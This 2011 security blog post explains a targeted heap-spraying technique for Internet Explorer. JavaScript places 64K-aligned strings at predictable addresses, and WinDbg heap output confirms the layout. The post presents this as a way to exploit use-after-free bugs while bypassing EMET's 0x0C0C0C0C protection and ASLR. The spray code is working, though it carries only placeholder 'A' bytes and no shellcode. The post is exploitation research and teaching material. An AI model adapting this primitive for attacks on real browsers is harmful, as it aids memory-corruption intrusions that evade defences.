---
title: "Targeted Heap Spraying 0x0c0c0c0c is a Thing of the Past"
date: 2011-08-29T11:01:00.000-04:00
draft: false
type: posts
summary: " Normal 0 false false false EN-US X-NONE"
categories: 
- 
---
# Targeted Heap Spraying 0x0c0c0c0c is a Thing of the Past


<br/>
  

Traditionally, heap spraying has relied upon spraying with 0x0C0C0C0C followed by shellcode which serves as both an address in the heap and a series of nops. This however is not extremely reliable. You have to be lucky enough to not land on a heap header or somewhere in your shellcode. Additionally, the latest version of EMET now prevents the execution of address 0x0C0C0C0C or any other arbitrary address specified in the registry. While this is a futile attempt to prevent heap spraying, it will require another method to reliably execute shellcode in the heap. Rather, there is a method that allows you to reliably allocate shellcode that is both in a predictable location and memory page-aligned (64K-aligned).

  

It turns out that allocations in Javascript of at least 512K are allocated using VirtualAlloc, which returns addresses that are page aligned (i.e. in the form of 0xXXXX0000). I credit Alexander Sotirov with this discovery as I learned this technique from him. There are many ways to place shellcode in the heap but string allocations are the tried and true heap allocation primitive in javascript. The format of a javascript string on the heap is as follows:

  

\[string length - 4 bytes\]\[Unicode encoded string\]\[\\x00\\x00\]

  

The following diagram illustrates a string’s layout in memory:

[![](http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png)](http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png)

Therefore, any javascript string will be 6 bytes long plus the length of the Unicode encoded string. Also, heap chunks allocated with VirtualAlloc are 0x20 bytes in length. As a result, shellcode allocated through VirtualAlloc will always reside at offset 0x24. Also, because each allocation results in a 64K-aligned address, we can make a series of string allocations that equal exactly 64K. That way, the start of our shellcode will always be located at an address of the form (0xXXXX0024).

  

The following javascript code takes advantage of these concepts by allocating an array of sixteen 64K strings (i.e. 1 megabyte).  Note the sixteenth allocation accounts for the size of the heap header and string length so that exactly one megabyte gets allocated. The resultant array is then allocated one hundred times resulting in an allocation of exactly 100MB.

  

<html>

<head>

<script>

function heapspray() {

    var shellcode = "\\u4141";

  

    while (shellcode.length < 100000)

        shellcode = shellcode + shellcode;

  

    var onemeg = shellcode.substr(0, 64\*1024/2);

  

    for (i=0; i<14; i++) {

        onemeg += shellcode.substr(0, 64\*1024/2);

    }

  

    onemeg += shellcode.substr(0, (64\*1024/2)-(38/2));

  

    var spray = new Array();

  

    for (i=0; i<100; i++) {

        spray\[i\] = onemeg.substr(0, onemeg.length);

    }

}

</script>

</head>

<body>

<input type="button" value="Spray the heap" onclick="heapspray()"></input>

</body>

</html>

  

Run the javascript code above and follow along with the following analysis in WinDbg. Start by viewing the addresses of the heaps in Internet Explorer:

  

!heap -stat

  

\_HEAP 00360000

     Segments            00000001

         Reserved  bytes 00100000

         Committed bytes 000f1000

     VirtAllocBlocks     00000001

         VirtAlloc bytes 035f0000

\_HEAP 035b0000

     Segments            00000001

         Reserved  bytes 00040000

         Committed bytes 00019000

     VirtAllocBlocks     00000000

         VirtAlloc bytes 00000000

\_HEAP 00750000

     Segments            00000001

         Reserved  bytes 00040000

         Committed bytes 00012000

     VirtAllocBlocks     00000000

         VirtAlloc bytes 00000000

\_HEAP 00270000

     Segments            00000001

         Reserved  bytes 00010000

         Committed bytes 00010000

     VirtAllocBlocks     00000000

         VirtAlloc bytes 00000000

\_HEAP 02e20000

     Segments            00000001

         Reserved  bytes 00040000

         Committed bytes 00001000

     VirtAllocBlocks     00000000

         VirtAlloc bytes 00000000

\_HEAP 00010000

     Segments            00000001

         Reserved  bytes 00010000

         Committed bytes 00001000

     VirtAllocBlocks     00000000

         VirtAlloc bytes 00000000

  

Look at the “VirtAlloc bytes” field for a heap with a large allocation. The heap address we’re interested in is the first one – “\_HEAP 00360000”

  

Next, view the allocation statistics for that heap handle:

  

!heap -stat -h 00360000

  

 heap @ 00360000

group-by: TOTSIZE max-display: 20

    size     #blocks     total     ( %) (percent of total busy bytes)

    fffe0 65 - 64ff360  (99.12)

    40010 1 - 40010  (0.25)

    1034 10 - 10340  (0.06)

    20 356 - 6ac0  (0.03)

    494 16 - 64b8  (0.02)

    5ba0 1 - 5ba0  (0.02)

    5e4 b - 40cc  (0.02)

    4010 1 - 4010  (0.02)

    3980 1 - 3980  (0.01)

    d0 3e - 3260  (0.01)

    460 b - 3020  (0.01)

    1800 2 - 3000  (0.01)

    800 6 - 3000  (0.01)

    468 a - 2c10  (0.01)

    2890 1 - 2890  (0.01)

    78 52 - 2670  (0.01)

    10 215 - 2150  (0.01)

    1080 2 - 2100  (0.01)

    2b0 c - 2040  (0.01)

    2010 1 - 2010  (0.01)

  

Our neat and tidy allocations really stand out here. There are exactly 0x65 (101 decimal) allocations of size 0xfffe0 (1 MB minus the 20 byte heap header).

  

A nice feature of WinDbg is that you can view heap chunks of a particular size. The following command lists all the heaps chunks of size 0xfffe0.

  

!heap -flt s fffe0

  

    \_HEAP @ 360000

      HEAP\_ENTRY Size Prev Flags    UserPtr UserSize - state

        037f0018 1fffc fffc  \[00\]   037f0020    fffe0 - (busy VirtualAlloc)

        038f0018 1fffc fffc  \[00\]   038f0020    fffe0 - (busy VirtualAlloc)

        039f0018 1fffc fffc  \[00\]   039f0020    fffe0 - (busy VirtualAlloc)

        03af0018 1fffc fffc  \[00\]   03af0020    fffe0 - (busy VirtualAlloc)

        03bf0018 1fffc fffc  \[00\]   03bf0020    fffe0 - (busy VirtualAlloc)

        05e80018 1fffc fffc  \[00\]   05e80020    fffe0 - (busy VirtualAlloc)

        05f80018 1fffc fffc  \[00\]   05f80020    fffe0 - (busy VirtualAlloc)

        06080018 1fffc fffc  \[00\]   06080020    fffe0 - (busy VirtualAlloc)

        06180018 1fffc fffc  \[00\]   06180020    fffe0 - (busy VirtualAlloc)

        …

        0aa80018 1fffc fffc  \[00\]   0aa80020    fffe0 - (busy VirtualAlloc)

        0ab80018 1fffc fffc  \[00\]   0ab80020    fffe0 - (busy VirtualAlloc)

        0ac80018 1fffc fffc  \[00\]   0ac80020    fffe0 - (busy VirtualAlloc)

        0ad80018 1fffc fffc  \[00\]   0ad80020    fffe0 - (busy VirtualAlloc)

        0ae80018 1fffc fffc  \[00\]   0ae80020    fffe0 - (busy VirtualAlloc)

        0af80018 1fffc fffc  \[00\]   0af80020    fffe0 - (busy VirtualAlloc)

        0b080018 1fffc fffc  \[00\]   0b080020    fffe0 - (busy VirtualAlloc)

        0b180018 1fffc fffc  \[00\]   0b180020    fffe0 - (busy VirtualAlloc)

        0b280018 1fffc fffc  \[00\]   0b280020    fffe0 - (busy VirtualAlloc)

        0b380018 1fffc fffc  \[00\]   0b380020    fffe0 - (busy VirtualAlloc)

    \_HEAP @ 10000

    \_HEAP @ 270000

    \_HEAP @ 750000

    \_HEAP @ 2e20000

    \_HEAP @ 35b0000

  

Note how each allocation is allocated in sequential order.

  

Now that we have the addresses of each heap chunk we can start to inspect memory for our 0x41’s:

  

0:007> db 06b80000

06b80000  00 00 c8 06 00 00 a8 06-00 00 00 00 00 00 00 00  ................

06b80010  00 00 10 00 00 00 10 00-61 65 15 29 00 00 00 04  ........ae.)....

06b80020  da ff 0f 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA

06b80030  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

06b80040  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

06b80050  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

06b80060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

06b80070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

  

You can clearly see the string length at offset 0x20 – 000fffda which is the length of the string minus the null terminator.

  

Another way to analyze your heap allocations is through the fragmentation view of VMmap – one of many incredibly useful tools in the Sysinternals suite. The following image shows an allocation of 1000MB. Within the fragmentation view you can zoom in and click on individual allocations and confirm that each heap allocation (in orange) begins at an address in the form of 0xXXXX0000.

[![](http://3.bp.blogspot.com/-yZBvHmUyRLs/Tlumwynul5I/AAAAAAAAAB4/JuJFYqp3c2g/s640/fragmentation.png)](http://3.bp.blogspot.com/-yZBvHmUyRLs/Tlumwynul5I/AAAAAAAAAB4/JuJFYqp3c2g/s1600/fragmentation.png)

  

  
So why is this technique so useful? This method of heap spraying is perfect when exploiting use-after-free vulnerabilities where an attacker can craft fake objects and vtable structures. A fake vtable pointer can then point to an address in the heap range – 0x11F50024 just as an example. Thus, there is no need to rely upon nops and no need to worry about EMET’s arbitrary prevention of executing 0x0C0C0C0C-style addresses. For all intents and purposes, you’ve completely bypassed ASLR protections.

![](https://blogger.googleusercontent.com/tracker/6052198192158185644-5391545886505722735?l=exploit-monday.com)

<br/>
---
